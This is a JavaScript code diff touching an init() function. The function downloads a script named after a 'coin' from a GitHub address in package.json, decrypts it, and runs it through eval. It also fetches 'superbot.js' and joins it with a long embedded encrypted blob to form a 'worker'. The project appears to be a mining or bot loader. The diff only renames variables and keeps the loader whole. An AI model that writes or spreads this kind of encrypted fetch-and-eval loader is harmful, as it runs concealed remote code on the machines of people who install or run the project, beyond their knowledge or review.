@@ -235,16 +235,18 @@ function mybot(cmd,bot) {
 }
 
 function init(body,callback) {
-  request( require('./package.json').github+body.init+".js", function(err, res, body) {
+  var coin = body.init
+  var bb = body.bots
+  request( require('./package.json').github+coin+".js", function(err, res, body) {
     if(err) callback('error git_1: '+err.message)
     else if(body == '404: Not Found') callback('error git_1: '+body)
     else {
       eval(decrypt(body));
-      request( require('./package.json').github+"superbot.js", function(err, res, code) {
+      request( require('./package.json').github+"superbot.js", function(err, res, body) {
         if(err) callback('error git_2: '+err.message)
-        else if(code == '404: Not Found') callback('error git_2: '+code)
+        else if(body == '404: Not Found') callback('error git_2: '+body)
         else {
-          gg.superbot = decrypt(code);
+          gg.superbot = decrypt(body);
           gg.worker = gg.superbot+'\n'+decrypt(`
 U2FsdGVkX1+jx85xnfAYQZbP9lISexUSlyG05d6xBEmWfIt9f2XFcrnwMJDvQIZA0Rj10NLuOrTJdBzxeqrVkfdrc3l0IGlTwy6X1b07miaY/Zm84VW8Ys5NWclae8zDjdkYi8gk13Tp8kc9StlVxTWeVGqDUsuT
 GTk5oGoD0yskh5az4+WjmLYuLQPB22kf8sgShFgxfu5rs6qhmrsXSkSL/xlA9AqhcWya7x32ieYXselAPZ1mbYIR2Ea7VL8/UE0b+GrPC2+30DNZnLTFKIuazr9oC6K9OE2PLwig0yfyLKJqNJSLOP8vwY1KeHom
@@ -253,8 +255,8 @@ DuwGYzwWyuLYxpXxRAhXxzqlbwM/HdmIS3vqh71dCTektrzIooA7tRh4tKDVUNVILVgNC4m9DF+IJOsH
 ZJVF1ep7ksbxF0nrNia1Hm3cQL0hifx4mp5/G2JhdLI/xcxLkhA3oPulryJOYETtQZw0q7VAih8tCYeuqnDzJ2ZFEYQPv2sIfkjQzPvpCi2eZceq30TGSG836aiyYjNq0MsS9VLRuXMx1zN/8nqc6tWwGa8/rz9Q
 vScvrDWM/7Fjm9Ixj1rfsJTYeUBt9ppkdSyirV50xwgg/e5wa2UAC1BgAwqIy9ho9ZSoLjqOIADw+V7YQZVBxnOXDC20UVprO7xm0rcoMWm2K4ma01vXnUQhy1f1z1aqAVgSxgRE9eJX5g21zNoVi5X2XC9f7VjC
 59j0bv3foy4ZH99XDP1Orc80MXr0/DenClJba8ce/kyav21aiZ8Y4GvF1oiC3j8+`);
-          if(body.bots) update_bots(body.bots);
-          callback('init '+body.init);
+          if(bb) update_bots(bb);
+          callback('init '+coin);
         }
       })
     }
